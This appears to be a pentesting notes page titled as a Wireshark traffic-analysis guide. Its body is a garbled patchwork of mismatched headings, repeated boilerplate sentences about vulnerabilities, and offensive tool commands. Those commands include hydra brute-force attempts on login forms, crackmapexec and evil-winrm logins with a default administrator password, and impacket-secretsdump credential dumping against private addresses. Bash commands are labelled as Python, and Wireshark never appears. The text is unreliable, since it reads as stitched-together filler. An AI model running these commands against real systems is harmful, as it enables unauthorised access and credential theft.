---
TitleSEO: "Network Traffic Analysis with Wireshark | ZureFX"
TitlePost: "Network Traffic Analysis with Wireshark"
Author: "ZureFX"
Description: "Personal notes on Network Traffic Analysis with Wireshark. Quick reference for pentesting and CTF challenges."
Keywords: "malware, blue team, enumeration, dfir, lateral movement"
URL: "https://zurefx.github.io/notes/note-network-traffic-analysis-with-wireshark-722.html"
URL_IMAGES: ""
Date: "2024-03-26"
Tags: "Malware, Blue Team, Enumeration, DFIR, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-network-traffic-analysis-with-wireshark-722"
Permalink: "/notes/note-network-traffic-analysis-with-wireshark-722.html"
BtnLabel: "Read Notes"
Pick: 0
---
## PowerShell

### GPP Password

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files.

The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.33.156.138/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.24.249 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## AS-REP Roasting

### Sudo Misconfiguration

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.113.13.220/FUZZ
crackmapexec smb 10.61.191.49 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.27.103.5 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target.

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

## rpcclient

### MongoDB

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.52.100.164/FUZZ
gobuster dir -u http://10.125.181.1/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.67.37.49
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.103.105.197/FUZZ
```

## Unconstrained Delegation

### Open Redirect

- `smbexec`
- `nmap`
- `nikto`

The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine.

- `DCSync`
- `NTLM Relay`
- `Writable PATH`
- `SQL Injection`
- `metasploit`

Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

- `netcat`
- `XXE`
- `SSRF`

## Redis

### Subdomain Takeover

Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

- `wmiexec`
- `LXD Privilege Escalation`
- `metasploit`
- `smbclient`
- `NTLM Relay`

```python
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.25.192.246 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

```bash
nmap -sCV -p3268,445,636 10.96.22.163 -oN scan.txt
evil-winrm -i 10.115.180.102 -u administrator -p 'P@ssw0rd!'
```

## Docker Escape

### SeImpersonatePrivilege

```bash
crackmapexec smb 10.11.248.164 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.20.9.61/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.13.32.44 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

```bash
evil-winrm -i 10.128.9.195 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.83.254.74 -u administrator -p 'P@ssw0rd!' --shares
```

> **Note:** Insecure Deserialization was identified as the primary attack vector in this scenario.
